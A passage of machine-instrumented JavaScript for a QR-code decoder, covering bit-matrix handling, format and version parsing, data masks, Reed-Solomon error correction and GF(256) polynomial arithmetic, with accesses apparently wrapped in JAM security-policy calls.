      var x$$56 = left$$1;
      var v551 = x$$56 < right$$1;
      for (;v551;) {
        var v549 = this.bits;
        var v550 = offset$$12 + (x$$56 >> 5);
        introspect(JAM.policy.p26) {
          var v2298 = v549[v550]
        }
        var v2299 = 1 << (x$$56 & 31);
        introspect(JAM.policy.p27) {
          v549[v550] = v2298 | v2299;
        }
        x$$56 = x$$56 + 1;
        v551 = x$$56 < right$$1;
      }
      y$$39 = y$$39 + 1;
      v552 = y$$39 < bottom;
    }
    return;
  }
  function v40() {
    var max$$3 = this.bits.length;
    var i$$10 = 0;
    var v555 = i$$10 < max$$3;
    for (;v555;) {
      var v554 = this.bits;
      introspect(JAM.policy.p27) {
        v554[i$$10] = 0;
      }
      i$$10 = i$$10 + 1;
      v555 = i$$10 < max$$3;
    }
    return;
  }
  function v39(x$$55, y$$38) {
    var offset$$11 = y$$38 * this.rowSize + (x$$55 >> 5);
    var v558 = this.bits;
    introspect(JAM.policy.p26) {
      var v2300 = v558[offset$$11]
    }
    var v2301 = 1 << (x$$55 & 31);
    introspect(JAM.policy.p27) {
      v558[offset$$11] = v2300 ^ v2301;
    }
    return;
  }
  function v38(x$$54, y$$37) {
    var offset$$10 = y$$37 * this.rowSize + (x$$54 >> 5);
    var v561 = this.bits;
    introspect(JAM.policy.p26) {
      var v2302 = v561[offset$$10]
    }
    var v2303 = 1 << (x$$54 & 31);
    introspect(JAM.policy.p27) {
      v561[offset$$10] = v2302 | v2303;
    }
    return;
  }
  function v37(x$$53, y$$36) {
    var offset$$9 = y$$36 * this.rowSize + (x$$53 >> 5);
    var v2587 = this.bits;
    introspect(JAM.policy.p26) {
      var v2304 = v2587[offset$$9]
    }
    return(JAM.call(URShift, null, [v2304, x$$53 & 31], JAM.policy.p38) & 1) !== 0;
  }
  function v36() {
    if (this.width !== this.height) {
      throw "Can't call getDimension() on a non-square matrix";
    }
    return this.width;
  }
  function v35() {
    return this.height;
  }
  function v34() {
    return this.width;
  }
  if (!height$$9) {
    height$$9 = width$$10;
  }
  var v1530 = width$$10 < 1;
  if (!v1530) {
    v1530 = height$$9 < 1;
  }
  if (v1530) {
    throw "Both dimensions must be greater than 0";
  }
  this.width = width$$10;
  this.height = height$$9;
  var rowSize = width$$10 >> 5;
  if ((width$$10 & 31) !== 0) {
    rowSize = rowSize + 1;
  }
  this.rowSize = rowSize;
  var v2854 = JAM.new(Array, [rowSize * height$$9], JAM.policy.p39);
  this.bits = v2854;
  var i$$9 = 0;
  var v571 = i$$9 < this.bits.length;
  for (;v571;) {
    var v570 = this.bits;
    introspect(JAM.policy.p27) {
      v570[i$$9] = 0;
    }
    i$$9 = i$$9 + 1;
    v571 = i$$9 < this.bits.length;
  }
  JAM.call(this.__defineGetter__, this, ["Width", v34], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Height", v35], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Dimension", v36], JAM.policy.p23);
  this.get_Renamed = v37;
  this.set_Renamed = v38;
  this.flip = v39;
  this.clear = v40;
  this.setRegion = v41;
  return;
}
function DataBlock(numDataCodewords, codewords) {
  function v43() {
    return this.codewords;
  }
  function v42() {
    return this.numDataCodewords;
  }
  this.numDataCodewords = numDataCodewords;
  this.codewords = codewords;
  JAM.call(this.__defineGetter__, this, ["NumDataCodewords", v42], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Codewords", v43], JAM.policy.p23);
  return;
}
function BitMatrixParser(bitMatrix$$1) {
  function v47() {
    var formatInfo$$2 = JAM.call(this.readFormatInformation, this, [], JAM.policy.p40);
    var version$$6 = JAM.call(this.readVersion, this, [], JAM.policy.p40);
    var dataMask$$1 = JAM.call(DataMask.forReference, DataMask, [formatInfo$$2.DataMask], JAM.policy.p39);
    var dimension$$11 = this.bitMatrix.Dimension;
    JAM.call(dataMask$$1.unmaskBitMatrix, dataMask$$1, [this.bitMatrix, dimension$$11], JAM.policy.p38);
    var functionPattern = JAM.call(version$$6.buildFunctionPattern, version$$6, [], JAM.policy.p40);
    var readingUp = true;
    var result$$2 = JAM.new(Array, [version$$6.TotalCodewords], JAM.policy.p39);
    var resultOffset = 0;
    var currentByte = 0;
    var bitsRead = 0;
    var j$$4 = dimension$$11 - 1;
    var v584 = j$$4 > 0;
    for (;v584;) {
      if (j$$4 === 6) {
        j$$4 = j$$4 - 1;
      }
      var count$$4 = 0;
      var v583 = count$$4 < dimension$$11;
      for (;v583;) {
        var v577;
        if (readingUp) {
          v577 = dimension$$11 - 1 - count$$4;
        } else {
          v577 = count$$4;
        }
        var i$$15 = v577;
        var col = 0;
        var v582 = col < 2;
        for (;v582;) {
          if (!JAM.call(functionPattern.get_Renamed, functionPattern, [j$$4 - col, i$$15], JAM.policy.p38)) {
            bitsRead = bitsRead + 1;
            currentByte = currentByte << 1;
            var v1536 = this.bitMatrix;
            if (JAM.call(v1536.get_Renamed, v1536, [j$$4 - col, i$$15], JAM.policy.p38)) {
              currentByte = currentByte | 1;
            }
            if (bitsRead === 8) {
              var v579 = resultOffset;
              resultOffset = resultOffset + 1;
              introspect(JAM.policy.p27) {
                result$$2[v579] = currentByte;
              }
              bitsRead = 0;
              currentByte = 0;
            }
          }
          col = col + 1;
          v582 = col < 2;
        }
        count$$4 = count$$4 + 1;
        v583 = count$$4 < dimension$$11;
      }
      readingUp = readingUp ^ true;
      j$$4 = j$$4 - 2;
      v584 = j$$4 > 0;
    }
    if (resultOffset !== version$$6.TotalCodewords) {
      throw "Error readCodewords";
    }
    return result$$2;
  }
  function v46() {
    if (this.parsedVersion !== null) {
      return this.parsedVersion;
    }
    var dimension$$10 = this.bitMatrix.Dimension;
    var provisionalVersion$$1 = dimension$$10 - 17 >> 2;
    if (provisionalVersion$$1 <= 6) {
      return JAM.call(Version.getVersionForNumber, Version, [provisionalVersion$$1], JAM.policy.p39);
    }
    var versionBits$$2 = 0;
    var ijMin = dimension$$10 - 11;
    var j$$3 = 5;
    var v591 = j$$3 >= 0;
    for (;v591;) {
      var i$$14 = dimension$$10 - 9;
      var v590 = i$$14 >= ijMin;
      for (;v590;) {
        versionBits$$2 = JAM.call(this.copyBit, this, [i$$14, j$$3, versionBits$$2], JAM.policy.p38);
        i$$14 = i$$14 - 1;
        v590 = i$$14 >= ijMin;
      }
      j$$3 = j$$3 - 1;
      v591 = j$$3 >= 0;
    }
    var v2855 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p39);
    this.parsedVersion = v2855;
    var v1540 = this.parsedVersion !== null;
    if (v1540) {
      v1540 = this.parsedVersion.DimensionForVersion === dimension$$10;
    }
    if (v1540) {
      return this.parsedVersion;
    }
    versionBits$$2 = 0;
    i$$14 = 5;
    var v594 = i$$14 >= 0;
    for (;v594;) {
      j$$3 = dimension$$10 - 9;
      var v593 = j$$3 >= ijMin;
      for (;v593;) {
        versionBits$$2 = JAM.call(this.copyBit, this, [i$$14, j$$3, versionBits$$2], JAM.policy.p38);
        j$$3 = j$$3 - 1;
        v593 = j$$3 >= ijMin;
      }
      i$$14 = i$$14 - 1;
      v594 = i$$14 >= 0;
    }
    var v2856 = JAM.call(Version.decodeVersionInformation, Version, [versionBits$$2], JAM.policy.p39);
    this.parsedVersion = v2856;
    var v1541 = this.parsedVersion !== null;
    if (v1541) {
      v1541 = this.parsedVersion.DimensionForVersion === dimension$$10;
    }
    if (v1541) {
      return this.parsedVersion;
    }
    throw "Error readVersion";
  }
  function v45() {
    if (this.parsedFormatInfo !== null) {
      return this.parsedFormatInfo;
    }
    var formatInfoBits = 0;
    var i$$13 = 0;
    var v597 = i$$13 < 6;
    for (;v597;) {
      formatInfoBits = JAM.call(this.copyBit, this, [i$$13, 8, formatInfoBits], JAM.policy.p41);
      i$$13 = i$$13 + 1;
      v597 = i$$13 < 6;
    }
    formatInfoBits = JAM.call(this.copyBit, this, [7, 8, formatInfoBits], JAM.policy.p22);
    formatInfoBits = JAM.call(this.copyBit, this, [8, 8, formatInfoBits], JAM.policy.p22);
    formatInfoBits = JAM.call(this.copyBit, this, [8, 7, formatInfoBits], JAM.policy.p22);
    var j$$2 = 5;
    var v598 = j$$2 >= 0;
    for (;v598;) {
      formatInfoBits = JAM.call(this.copyBit, this, [8, j$$2, formatInfoBits], JAM.policy.p22);
      j$$2 = j$$2 - 1;
      v598 = j$$2 >= 0;
    }
    var v2857 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p39);
    this.parsedFormatInfo = v2857;
    if (this.parsedFormatInfo !== null) {
      return this.parsedFormatInfo;
    }
    var dimension$$9 = this.bitMatrix.Dimension;
    formatInfoBits = 0;
    var iMin = dimension$$9 - 8;
    i$$13 = dimension$$9 - 1;
    var v601 = i$$13 >= iMin;
    for (;v601;) {
      formatInfoBits = JAM.call(this.copyBit, this, [i$$13, 8, formatInfoBits], JAM.policy.p41);
      i$$13 = i$$13 - 1;
      v601 = i$$13 >= iMin;
    }
    j$$2 = dimension$$9 - 7;
    var v602 = j$$2 < dimension$$9;
    for (;v602;) {
      formatInfoBits = JAM.call(this.copyBit, this, [8, j$$2, formatInfoBits], JAM.policy.p22);
      j$$2 = j$$2 + 1;
      v602 = j$$2 < dimension$$9;
    }
    var v2858 = JAM.call(FormatInformation.decodeFormatInformation, FormatInformation, [formatInfoBits], JAM.policy.p39);
    this.parsedFormatInfo = v2858;
    if (this.parsedFormatInfo !== null) {
      return this.parsedFormatInfo;
    }
    throw "Error readFormatInformation";
  }
  function v44(i$$12, j$$1, versionBits$$1) {
    var v604;
    var v2314 = this.bitMatrix;
    if (JAM.call(v2314.get_Renamed, v2314, [i$$12, j$$1], JAM.policy.p38)) {
      v604 = versionBits$$1 << 1 | 1;
    } else {
      v604 = versionBits$$1 << 1;
    }
    return v604;
  }
  var dimension$$8 = bitMatrix$$1.Dimension;
  var v1547 = dimension$$8 < 21;
  if (!v1547) {
    v1547 = (dimension$$8 & 3) !== 1;
  }
  if (v1547) {
    throw "Error BitMatrixParser";
  }
  this.bitMatrix = bitMatrix$$1;
  this.parsedVersion = null;
  this.parsedFormatInfo = null;
  this.copyBit = v44;
  this.readFormatInformation = v45;
  this.readVersion = v46;
  this.readCodewords = v47;
  return;
}
function DataMask000() {
  function v49(i$$17, j$$6) {
    return(i$$17 + j$$6 & 1) === 0;
  }
  function v48(bits$$5, dimension$$12) {
    var i$$16 = 0;
    var v609 = i$$16 < dimension$$12;
    for (;v609;) {
      var j$$5 = 0;
      var v608 = j$$5 < dimension$$12;
      for (;v608;) {
        if (JAM.call(this.isMasked, this, [i$$16, j$$5], JAM.policy.p38)) {
          JAM.call(bits$$5.flip, bits$$5, [j$$5, i$$16], JAM.policy.p38);
        }
        j$$5 = j$$5 + 1;
        v608 = j$$5 < dimension$$12;
      }
      i$$16 = i$$16 + 1;
      v609 = i$$16 < dimension$$12;
    }
    return;
  }
  this.unmaskBitMatrix = v48;
  this.isMasked = v49;
  return;
}
function DataMask001() {
  function v51(i$$19, j$$8) {
    return(i$$19 & 1) === 0;
  }
  function v50(bits$$6, dimension$$13) {
    var i$$18 = 0;
    var v613 = i$$18 < dimension$$13;
    for (;v613;) {
      var j$$7 = 0;
      var v612 = j$$7 < dimension$$13;
      for (;v612;) {
        if (JAM.call(this.isMasked, this, [i$$18, j$$7], JAM.policy.p38)) {
          JAM.call(bits$$6.flip, bits$$6, [j$$7, i$$18], JAM.policy.p38);
        }
        j$$7 = j$$7 + 1;
        v612 = j$$7 < dimension$$13;
      }
      i$$18 = i$$18 + 1;
      v613 = i$$18 < dimension$$13;
    }
    return;
  }
  this.unmaskBitMatrix = v50;
  this.isMasked = v51;
  return;
}
function DataMask010() {
  function v53(i$$21, j$$10) {
    return j$$10 % 3 === 0;
  }
  function v52(bits$$7, dimension$$14) {
    var i$$20 = 0;
    var v617 = i$$20 < dimension$$14;
    for (;v617;) {
      var j$$9 = 0;
      var v616 = j$$9 < dimension$$14;
      for (;v616;) {
        if (JAM.call(this.isMasked, this, [i$$20, j$$9], JAM.policy.p38)) {
          JAM.call(bits$$7.flip, bits$$7, [j$$9, i$$20], JAM.policy.p38);
        }
        j$$9 = j$$9 + 1;
        v616 = j$$9 < dimension$$14;
      }
      i$$20 = i$$20 + 1;
      v617 = i$$20 < dimension$$14;
    }
    return;
  }
  this.unmaskBitMatrix = v52;
  this.isMasked = v53;
  return;
}
function DataMask011() {
  function v55(i$$23, j$$12) {
    return(i$$23 + j$$12) % 3 === 0;
  }
  function v54(bits$$8, dimension$$15) {
    var i$$22 = 0;
    var v621 = i$$22 < dimension$$15;
    for (;v621;) {
      var j$$11 = 0;
      var v620 = j$$11 < dimension$$15;
      for (;v620;) {
        if (JAM.call(this.isMasked, this, [i$$22, j$$11], JAM.policy.p38)) {
          JAM.call(bits$$8.flip, bits$$8, [j$$11, i$$22], JAM.policy.p38);
        }
        j$$11 = j$$11 + 1;
        v620 = j$$11 < dimension$$15;
      }
      i$$22 = i$$22 + 1;
      v621 = i$$22 < dimension$$15;
    }
    return;
  }
  this.unmaskBitMatrix = v54;
  this.isMasked = v55;
  return;
}
function DataMask100() {
  function v57(i$$25, j$$14) {
    return(JAM.call(URShift, null, [i$$25, 1], JAM.policy.p41) + j$$14 / 3 & 1) === 0;
  }
  function v56(bits$$9, dimension$$16) {
    var i$$24 = 0;
    var v625 = i$$24 < dimension$$16;
    for (;v625;) {
      var j$$13 = 0;
      var v624 = j$$13 < dimension$$16;
      for (;v624;) {
        if (JAM.call(this.isMasked, this, [i$$24, j$$13], JAM.policy.p38)) {
          JAM.call(bits$$9.flip, bits$$9, [j$$13, i$$24], JAM.policy.p38);
        }
        j$$13 = j$$13 + 1;
        v624 = j$$13 < dimension$$16;
      }
      i$$24 = i$$24 + 1;
      v625 = i$$24 < dimension$$16;
    }
    return;
  }
  this.unmaskBitMatrix = v56;
  this.isMasked = v57;
  return;
}
function DataMask101() {
  function v59(i$$27, j$$16) {
    var temp$$1 = i$$27 * j$$16;
    return(temp$$1 & 1) + temp$$1 % 3 === 0;
  }
  function v58(bits$$10, dimension$$17) {
    var i$$26 = 0;
    var v629 = i$$26 < dimension$$17;
    for (;v629;) {
      var j$$15 = 0;
      var v628 = j$$15 < dimension$$17;
      for (;v628;) {
        if (JAM.call(this.isMasked, this, [i$$26, j$$15], JAM.policy.p38)) {
          JAM.call(bits$$10.flip, bits$$10, [j$$15, i$$26], JAM.policy.p38);
        }
        j$$15 = j$$15 + 1;
        v628 = j$$15 < dimension$$17;
      }
      i$$26 = i$$26 + 1;
      v629 = i$$26 < dimension$$17;
    }
    return;
  }
  this.unmaskBitMatrix = v58;
  this.isMasked = v59;
  return;
}
function DataMask110() {
  function v61(i$$29, j$$18) {
    var temp$$2 = i$$29 * j$$18;
    return((temp$$2 & 1) + temp$$2 % 3 & 1) === 0;
  }
  function v60(bits$$11, dimension$$18) {
    var i$$28 = 0;
    var v633 = i$$28 < dimension$$18;
    for (;v633;) {
      var j$$17 = 0;
      var v632 = j$$17 < dimension$$18;
      for (;v632;) {
        if (JAM.call(this.isMasked, this, [i$$28, j$$17], JAM.policy.p38)) {
          JAM.call(bits$$11.flip, bits$$11, [j$$17, i$$28], JAM.policy.p38);
        }
        j$$17 = j$$17 + 1;
        v632 = j$$17 < dimension$$18;
      }
      i$$28 = i$$28 + 1;
      v633 = i$$28 < dimension$$18;
    }
    return;
  }
  this.unmaskBitMatrix = v60;
  this.isMasked = v61;
  return;
}
function DataMask111() {
  function v63(i$$31, j$$20) {
    return((i$$31 + j$$20 & 1) + i$$31 * j$$20 % 3 & 1) === 0;
  }
  function v62(bits$$12, dimension$$19) {
    var i$$30 = 0;
    var v637 = i$$30 < dimension$$19;
    for (;v637;) {
      var j$$19 = 0;
      var v636 = j$$19 < dimension$$19;
      for (;v636;) {
        if (JAM.call(this.isMasked, this, [i$$30, j$$19], JAM.policy.p38)) {
          JAM.call(bits$$12.flip, bits$$12, [j$$19, i$$30], JAM.policy.p38);
        }
        j$$19 = j$$19 + 1;
        v636 = j$$19 < dimension$$19;
      }
      i$$30 = i$$30 + 1;
      v637 = i$$30 < dimension$$19;
    }
    return;
  }
  this.unmaskBitMatrix = v62;
  this.isMasked = v63;
  return;
}
function ReedSolomonDecoder(field) {
  function v67(errorEvaluator, errorLocations$$1, dataMatrix$$1) {
    var s$$3 = errorLocations$$1.length;
    var result$$4 = JAM.new(Array, [s$$3], JAM.policy.p39);
    var i$$34 = 0;
    var v648 = i$$34 < s$$3;
    for (;v648;) {
      var v638 = this.field;
      introspect(JAM.policy.p26) {
        var v639 = errorLocations$$1[i$$34]
      }
      var xiInverse = JAM.call(v638.inverse, v638, [v639], JAM.policy.p39);
      var denominator$$3 = 1;
      var j$$21 = 0;
      var v643 = j$$21 < s$$3;
      for (;v643;) {
        if (i$$34 !== j$$21) {
          var v640 = this.field;
          var v2323 = this.field;
          introspect(JAM.policy.p26) {
            var v2324 = errorLocations$$1[j$$21]
          }
          denominator$$3 = JAM.call(v640.multiply, v640, [denominator$$3, JAM.call(GF256.addOrSubtract, GF256, [1, JAM.call(v2323.multiply, v2323, [v2324, xiInverse], JAM.policy.p38)], JAM.policy.p22)], JAM.policy.p38);
        }
        j$$21 = j$$21 + 1;
        v643 = j$$21 < s$$3;
      }
      var v644 = result$$4;
      var v645 = i$$34;
      var v1556 = this.field;
      var v1557 = JAM.call(errorEvaluator.evaluateAt, errorEvaluator, [xiInverse], JAM.policy.p39);
      var v2325 = this.field;
      var v2859 = JAM.call(v1556.multiply, v1556, [v1557, JAM.call(v2325.inverse, v2325, [denominator$$3], JAM.policy.p39)], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v644[v645] = v2859;
      }
      if (dataMatrix$$1) {
        var v646 = result$$4;
        var v647 = i$$34;
        var v1559 = this.field;
        introspect(JAM.policy.p26) {
          var v1560 = result$$4[i$$34]
        }
        var v2860 = JAM.call(v1559.multiply, v1559, [v1560, xiInverse], JAM.policy.p38);
        introspect(JAM.policy.p27) {
          v646[v647] = v2860;
        }
      }
      i$$34 = i$$34 + 1;
      v648 = i$$34 < s$$3;
    }
    return result$$4;
  }
  function v66(errorLocator) {
    var numErrors = errorLocator.Degree;
    if (numErrors === 1) {
      return JAM.new(Array, [JAM.call(errorLocator.getCoefficient, errorLocator, [1], JAM.policy.p25)], JAM.policy.p39);
    }
    var result$$3 = JAM.new(Array, [numErrors], JAM.policy.p39);
    var e$$4 = 0;
    var i$$33 = 1;
    var v1561 = i$$33 < 256;
    if (v1561) {
      v1561 = e$$4 < numErrors;
    }
    var v654 = v1561;
    for (;v654;) {
      if (JAM.call(errorLocator.evaluateAt, errorLocator, [i$$33], JAM.policy.p39) === 0) {
        var v651 = result$$3;
        var v652 = e$$4;
        var v1563 = this.field;
        var v2861 = JAM.call(v1563.inverse, v1563, [i$$33], JAM.policy.p39);
        introspect(JAM.policy.p27) {
          v651[v652] = v2861;
        }
        e$$4 = e$$4 + 1;
      }
      i$$33 = i$$33 + 1;
      var v1564 = i$$33 < 256;
      if (v1564) {
        v1564 = e$$4 < numErrors;
      }
      v654 = v1564;
    }
    if (e$$4 !== numErrors) {
      throw "Error locator degree does not match number of roots";
    }
    return result$$3;
  }
  function v65(a$$1, b$$1, R) {
    if (a$$1.Degree < b$$1.Degree) {
      var temp$$3 = a$$1;
      a$$1 = b$$1;
      b$$1 = temp$$3;
    }
    var rLast = a$$1;
    var r = b$$1;
    var sLast = this.field.One;
    var s$$2 = this.field.Zero;
    var tLast = this.field.Zero;
    var t = this.field.One;
    var v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p39);
    for (;v674;) {
      var rLastLast = rLast;
      var sLastLast = sLast;
      var tLastLast = tLast;
      rLast = r;
      sLast = s$$2;
      tLast = t;
      if (rLast.Zero) {
        throw "r_{i-1} was zero";
      }
      r = rLastLast;
      var q = this.field.Zero;
      var denominatorLeadingTerm = JAM.call(rLast.getCoefficient, rLast, [rLast.Degree], JAM.policy.p39);
      var v664 = this.field;
      var dltInverse = JAM.call(v664.inverse, v664, [denominatorLeadingTerm], JAM.policy.p39);
      var v1569 = r.Degree >= rLast.Degree;
      if (v1569) {
        v1569 = !r.Zero;
      }
      var v671 = v1569;
      for (;v671;) {
        var degreeDiff = r.Degree - rLast.Degree;
        var v667 = this.field;
        var scale$$1 = JAM.call(v667.multiply, v667, [JAM.call(r.getCoefficient, r, [r.Degree], JAM.policy.p39), dltInverse], JAM.policy.p38);
        var v1571 = this.field;
        q = JAM.call(q.addOrSubtract, q, [JAM.call(v1571.buildMonomial, v1571, [degreeDiff, scale$$1], JAM.policy.p38)], JAM.policy.p39);
        r = JAM.call(r.addOrSubtract, r, [JAM.call(rLast.multiplyByMonomial, rLast, [degreeDiff, scale$$1], JAM.policy.p38)], JAM.policy.p39);
        var v1572 = r.Degree >= rLast.Degree;
        if (v1572) {
          v1572 = !r.Zero;
        }
        v671 = v1572;
      }
      var v672 = JAM.call(q.multiply1, q, [sLast], JAM.policy.p39);
      s$$2 = JAM.call(v672.addOrSubtract, v672, [sLastLast], JAM.policy.p39);
      var v673 = JAM.call(q.multiply1, q, [tLast], JAM.policy.p39);
      t = JAM.call(v673.addOrSubtract, v673, [tLastLast], JAM.policy.p39);
      v674 = r.Degree >= JAM.call(Math.floor, Math, [R / 2], JAM.policy.p39);
    }
    var sigmaTildeAtZero = JAM.call(t.getCoefficient, t, [0], JAM.policy.p25);
    if (sigmaTildeAtZero === 0) {
      throw "ReedSolomonException sigmaTilde(0) was zero";
    }
    var v676 = this.field;
    var inverse = JAM.call(v676.inverse, v676, [sigmaTildeAtZero], JAM.policy.p39);
    var sigma$$1 = JAM.call(t.multiply2, t, [inverse], JAM.policy.p39);
    var omega$$1 = JAM.call(r.multiply2, r, [inverse], JAM.policy.p39);
    return JAM.new(Array, [sigma$$1, omega$$1], JAM.policy.p38);
  }
  function v64(received, twoS) {
    var poly = JAM.new(GF256Poly, [this.field, received], JAM.policy.p38);
    var syndromeCoefficients = JAM.new(Array, [twoS], JAM.policy.p39);
    var i$$32 = 0;
    var v678 = i$$32 < syndromeCoefficients.length;
    for (;v678;) {
      introspect(JAM.policy.p27) {
        syndromeCoefficients[i$$32] = 0;
      }
      i$$32 = i$$32 + 1;
      v678 = i$$32 < syndromeCoefficients.length;
    }
    var dataMatrix = false;
    var noError = true;
    i$$32 = 0;
    var v682 = i$$32 < twoS;
    for (;v682;) {
      var v1577 = this.field;
      var v2334;
      if (dataMatrix) {
        v2334 = i$$32 + 1;
      } else {
        v2334 = i$$32;
      }
      var evalx = JAM.call(poly.evaluateAt, poly, [JAM.call(v1577.exp, v1577, [v2334], JAM.policy.p39)], JAM.policy.p39);
      var v680 = syndromeCoefficients.length - 1 - i$$32;
      introspect(JAM.policy.p27) {
        syndromeCoefficients[v680] = evalx;
      }
      if (evalx !== 0) {
        noError = false;
      }
      i$$32 = i$$32 + 1;
      v682 = i$$32 < twoS;
    }
    if (noError) {
      return;
    }
    var syndrome = JAM.new(GF256Poly, [this.field, syndromeCoefficients], JAM.policy.p38);
    var v1580 = this.field;
    var sigmaOmega = JAM.call(this.runEuclideanAlgorithm, this, [JAM.call(v1580.buildMonomial, v1580, [twoS, 1], JAM.policy.p41), syndrome, twoS], JAM.policy.p38);
    introspect(JAM.policy.p26) {
      var sigma = sigmaOmega[0]
    }
    introspect(JAM.policy.p26) {
      var omega = sigmaOmega[1]
    }
    var errorLocations = JAM.call(this.findErrorLocations, this, [sigma], JAM.policy.p39);
    var errorMagnitudes = JAM.call(this.findErrorMagnitudes, this, [omega, errorLocations, dataMatrix], JAM.policy.p38);
    i$$32 = 0;
    var v690 = i$$32 < errorLocations.length;
    for (;v690;) {
      var v685 = received.length - 1;
      var v1583 = this.field;
      introspect(JAM.policy.p26) {
        var v1584 = errorLocations[i$$32]
      }
      var position = v685 - JAM.call(v1583.log, v1583, [v1584], JAM.policy.p39);
      if (position < 0) {
        throw "ReedSolomonException Bad error location";
      }
      var v688 = received;
      var v689 = position;
      introspect(JAM.policy.p26) {
        var v1585 = received[position]
      }
      introspect(JAM.policy.p26) {
        var v1586 = errorMagnitudes[i$$32]
      }
      var v2862 = JAM.call(GF256.addOrSubtract, GF256, [v1585, v1586], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v688[v689] = v2862;
      }
      i$$32 = i$$32 + 1;
      v690 = i$$32 < errorLocations.length;
    }
    return;
  }
  this.field = field;
  this.decode = v64;
  this.runEuclideanAlgorithm = v65;
  this.findErrorLocations = v66;
  this.findErrorMagnitudes = v67;
  return;
}
function GF256Poly(field$$1, coefficients) {
  function v77(other$$8) {
    if (this.field !== other$$8.field) {
      throw "GF256Polys do not have same GF256 field";
    }
    if (other$$8.Zero) {
      throw "Divide by 0";
    }
    var quotient = this.field.Zero;
    var remainder = this;
    var denominatorLeadingTerm$$1 = JAM.call(other$$8.getCoefficient, other$$8, [other$$8.Degree], JAM.policy.p39);
    var v695 = this.field;
    var inverseDenominatorLeadingTerm = JAM.call(v695.inverse, v695, [denominatorLeadingTerm$$1], JAM.policy.p39);
    var v1590 = remainder.Degree >= other$$8.Degree;
    if (v1590) {
      v1590 = !remainder.Zero;
    }
    var v701 = v1590;
    for (;v701;) {
      var degreeDifference = remainder.Degree - other$$8.Degree;
      var v698 = this.field;
      var scale$$2 = JAM.call(v698.multiply, v698, [JAM.call(remainder.getCoefficient, remainder, [remainder.Degree], JAM.policy.p39), inverseDenominatorLeadingTerm], JAM.policy.p38);
      var term = JAM.call(other$$8.multiplyByMonomial, other$$8, [degreeDifference, scale$$2], JAM.policy.p38);
      var v700 = this.field;
      var iterationQuotient = JAM.call(v700.buildMonomial, v700, [degreeDifference, scale$$2], JAM.policy.p38);
      quotient = JAM.call(quotient.addOrSubtract, quotient, [iterationQuotient], JAM.policy.p39);
      remainder = JAM.call(remainder.addOrSubtract, remainder, [term], JAM.policy.p39);
      var v1592 = remainder.Degree >= other$$8.Degree;
      if (v1592) {
        v1592 = !remainder.Zero;
      }
      v701 = v1592;
    }
    return JAM.new(Array, [quotient, remainder], JAM.policy.p38);
  }
  function v76(degree$$1, coefficient) {
    if (degree$$1 < 0) {
      throw "System.ArgumentException";
    }
    if (coefficient === 0) {
      return this.field.Zero;
    }
    var size$$6 = this.coefficients.length;
    var product$$2 = JAM.new(Array, [size$$6 + degree$$1], JAM.policy.p39);
    var i$$40 = 0;
    var v707 = i$$40 < product$$2.length;
    for (;v707;) {
      introspect(JAM.policy.p27) {
        product$$2[i$$40] = 0;
      }
      i$$40 = i$$40 + 1;
      v707 = i$$40 < product$$2.length;
    }
    i$$40 = 0;
    var v710 = i$$40 < size$$6;
    for (;v710;) {
      var v708 = product$$2;
      var v709 = i$$40;
      var v1595 = this.field;
      var v2342 = this.coefficients;
      introspect(JAM.policy.p26) {
        var v1596 = v2342[i$$40]
      }
      var v2863 = JAM.call(v1595.multiply, v1595, [v1596, coefficient], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v708[v709] = v2863;
      }
      i$$40 = i$$40 + 1;
      v710 = i$$40 < size$$6;
    }
    return JAM.new(GF256Poly, [this.field, product$$2], JAM.policy.p38);
  }
  function v75(scalar) {
    if (scalar === 0) {
      return this.field.Zero;
    }
    if (scalar === 1) {
      return this;
    }
    var size$$5 = this.coefficients.length;
    var product$$1 = JAM.new(Array, [size$$5], JAM.policy.p39);
    var i$$39 = 0;
    var v718 = i$$39 < size$$5;
    for (;v718;) {
      var v716 = product$$1;
      var v717 = i$$39;
      var v1597 = this.field;
      var v2343 = this.coefficients;
      introspect(JAM.policy.p26) {
        var v1598 = v2343[i$$39]
      }
      var v2864 = JAM.call(v1597.multiply, v1597, [v1598, scalar], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v716[v717] = v2864;
      }
      i$$39 = i$$39 + 1;
      v718 = i$$39 < size$$5;
    }
    return JAM.new(GF256Poly, [this.field, product$$1], JAM.policy.p38);
  }
  function v74(other$$7) {
    if (this.field !== other$$7.field) {
      throw "GF256Polys do not have same GF256 field";
    }
    var v1601 = this.Zero;
    if (!v1601) {
      v1601 = other$$7.Zero;
    }
    if (v1601) {
      return this.field.Zero;
    }
    var aCoefficients = this.coefficients;
    var aLength = aCoefficients.length;
    var bCoefficients = other$$7.coefficients;
    var bLength = bCoefficients.length;
    var product = JAM.new(Array, [aLength + bLength - 1], JAM.policy.p39);
    var i$$38 = 0;
    var v727 = i$$38 < aLength;
    for (;v727;) {
      introspect(JAM.policy.p26) {
        var aCoeff = aCoefficients[i$$38]
      }
      var j$$22 = 0;
      var v726 = j$$22 < bLength;
      for (;v726;) {
        var v724 = product;
        var v725 = i$$38 + j$$22;
        var v2345 = i$$38 + j$$22;
        introspect(JAM.policy.p26) {
          var v1603 = product[v2345]
        }
        var v2346 = this.field;
        introspect(JAM.policy.p26) {
          var v2347 = bCoefficients[j$$22]
        }
        var v2865 = JAM.call(GF256.addOrSubtract, GF256, [v1603, JAM.call(v2346.multiply, v2346, [aCoeff, v2347], JAM.policy.p38)], JAM.policy.p38);
        introspect(JAM.policy.p27) {
          v724[v725] = v2865;
        }
        j$$22 = j$$22 + 1;
        v726 = j$$22 < bLength;
      }
      i$$38 = i$$38 + 1;
      v727 = i$$38 < aLength;
    }
    return JAM.new(GF256Poly, [this.field, product], JAM.policy.p38);
  }
  function v73(other$$6) {
    if (this.field !== other$$6.field) {
      throw "GF256Polys do not have same GF256 field";
    }
    if (this.Zero) {
      return other$$6;
    }
    if (other$$6.Zero) {
      return this;
    }
    var smallerCoefficients = this.coefficients;
    var largerCoefficients = other$$6.coefficients;
    if (smallerCoefficients.length > largerCoefficients.length) {
      var temp$$4 = smallerCoefficients;
      smallerCoefficients = largerCoefficients;
